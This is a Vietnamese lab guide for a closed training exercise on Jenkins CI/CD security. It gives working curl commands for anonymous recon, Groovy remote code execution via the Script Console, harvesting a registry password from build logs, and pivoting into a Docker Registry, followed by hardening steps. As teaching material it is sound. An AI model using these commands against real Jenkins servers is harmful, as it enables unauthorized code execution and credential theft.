# HƯỚNG DẪN THỰC HÀNH — Bảo mật CI/CD Pipeline (Jenkins)

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| Tên lab | `dso-cicd-jenkins` |
| Mức độ | Nâng cao |
| Công cụ | curl, jq, grep, tar |

Mục tiêu: khai thác một máy chủ Jenkins cấu hình sai (truy cập ẩn danh, Script Console mở), đạt RCE lấy flag trên máy CI, trích xuất credential registry bị lộ, pivot sang Docker Registry v2 lấy flag thứ hai, rồi hardening Jenkins.

## 2. Kịch bản

Sinh viên đóng vai attacker trong mạng nội bộ ACME DevOps. Máy `client` (172.39.0.30) có terminal. Mục tiêu: `jenkins` (172.39.0.10:8080) và `registry` (172.39.0.20:5000). Chỉ `client` có terminal.

```
client ---recon REST---> jenkins ---Script Console RCE---> flag_ci
       ---creds lo trong build log---> pivot (Basic Auth) ---> registry ---> flag_pivot
       ---RCE dat lai bao mat---> hardening jenkins
```

## 3. Kiến thức bổ trợ

Jenkins tách Authentication (bạn là ai) và Authorization (được làm gì). Cấu hình "anyone can do anything" cho phép người chưa đăng nhập đọc/điều khiển Jenkins (MITRE T1078). Script Console (`/script`, `/scriptText`) chạy Groovy trong tiến trình Jenkins → RCE (T1059). Credential hay bị lộ trong build log, biến môi trường job, hoặc credential store. Pivot bằng credential hợp lệ (T1078) khó bị phát hiện. Hardening: bật xác thực, thu hồi quyền ẩn danh, khóa Script Console, quản lý secret bằng Credentials Plugin + mask log.

## 4. Các nhiệm vụ của bài thực hành

Khởi động bằng `imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/dso-cicd-jenkins.tar`, sau đó `labtainer dso-cicd-jenkins`.

### Nhiệm vụ 1 — `recon_jenkins`

```bash
curl -s -D - -o /dev/null http://jenkins:8080/ | grep -i X-Jenkins | tee ~/recon.txt
curl -s "http://jenkins:8080/api/json?pretty=true" | jq '.jobs[]?.name' | tee -a ~/recon.txt
echo "job: build-app" >> ~/recon.txt
```

Điều kiện: lấy được phiên bản Jenkins (header `X-Jenkins`) và liệt kê được job ở trạng thái ẩn danh (lưu `~/recon.txt`). Câu hỏi: việc người chưa đăng nhập đọc được REST API nói lên cấu hình authorization nào đang sai?

### Nhiệm vụ 2 — `rce_script_console`

```bash
curl -s --data-urlencode 'script=println "id".execute().text' http://jenkins:8080/scriptText
curl -s --data-urlencode 'script=println new File("/var/jenkins_home/flag_ci.txt").text' \
  http://jenkins:8080/scriptText | tr -d '\r\n ' | tee ~/flag_ci.txt
```

Điều kiện: thực thi được Groovy trên máy CI và lưu `flag_ci` vào `~/flag_ci.txt`. Câu hỏi: vì sao Script Console tương đương RCE toàn quyền trên máy CI?

### Nhiệm vụ 3 — `harvest_creds`

```bash
curl -s "http://jenkins:8080/job/build-app/lastBuild/consoleText" | tee ~/buildlog.txt | grep -Ei 'login|pass|deployer'
grep -o '\-p [^ ]*' ~/buildlog.txt | head -1 | awk '{print $2}' | tr -d '\r\n' | tee ~/regpass_loot.txt
echo "deployer:$(cat ~/regpass_loot.txt)" | tee ~/creds.txt
```

Điều kiện: trích được mật khẩu registry (lưu `~/regpass_loot.txt`, định dạng user:pass ở `~/creds.txt`). Câu hỏi: trong ba nguồn lộ lọt, nguồn nào nguy hiểm nhất với người chỉ có quyền đọc job?

### Nhiệm vụ 4 — `pivot_registry`

```bash
RP=$(cat ~/regpass_loot.txt)
curl -s -u "deployer:$RP" http://registry:5000/v2/_catalog | jq
MAN=$(curl -s -u "deployer:$RP" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' http://registry:5000/v2/acme/app/manifests/1.0)
DIG=$(echo "$MAN" | grep -o 'sha256:[0-9a-f]\{64\}' | tail -1)
curl -s -u "deployer:$RP" "http://registry:5000/v2/acme/app/blobs/$DIG" -o ~/layer.tar
cd ~ && tar -xzf ~/layer.tar
grep -o 'flag_pivot=.*' ~/flag_pivot.txt | cut -d= -f2 | tr -d '\r\n ' > ~/fp && mv ~/fp ~/flag_pivot.txt
cat ~/flag_pivot.txt
```

Điều kiện: xác thực registry bằng credential đánh cắp và lấy `flag_pivot` (lưu `~/flag_pivot.txt`). Câu hỏi: vì sao pivot bằng credential hợp lệ (T1078) khó phát hiện hơn khai thác lỗ hổng phần mềm?

### Nhiệm vụ 5 — `harden_jenkins`

Dùng chính quyền RCE để khắc phục: bật xác thực, thu hồi quyền của người dùng ẩn danh (chỉ dùng API lõi của Jenkins).

```bash
curl -s --data-urlencode 'script=import jenkins.model.*; import hudson.security.*; def j=Jenkins.instance; def r=new HudsonPrivateSecurityRealm(false); r.createAccount("admin","StrongPass_123"); j.setSecurityRealm(r); def s=new FullControlOnceLoggedInAuthorizationStrategy(); s.setAllowAnonymousRead(false); j.setAuthorizationStrategy(s); j.save(); println "hardened"' http://jenkins:8080/scriptText
AC=$(curl -s -o /dev/null -w '%{http_code}' http://jenkins:8080/api/json)
SC=$(curl -s -o /dev/null -w '%{http_code}' --data-urlencode 'script=println 1' http://jenkins:8080/scriptText)
printf 'api_anonymous=%s\nscript_anonymous=%s\n' "$AC" "$SC" | tee ~/harden_verify.txt
```

Điều kiện: sau hardening, truy vấn REST API và `scriptText` ở trạng thái ẩn danh trả về 401/403 (lưu `~/harden_verify.txt`). Câu hỏi: biện pháp hardening nào có hiệu quả chi phí cao nhất (chặn nhiều bước nhất với ít thay đổi nhất)?

Sau khi hoàn thành, chạy `checkwork` để kiểm tra kết quả.

## 5. Ánh xạ khung tham chiếu

OWASP CI/CD Top 10 (CICD-SEC-1,4,6,7); MITRE ATT&CK T1078 Valid Accounts, T1059 Command and Scripting Interpreter.
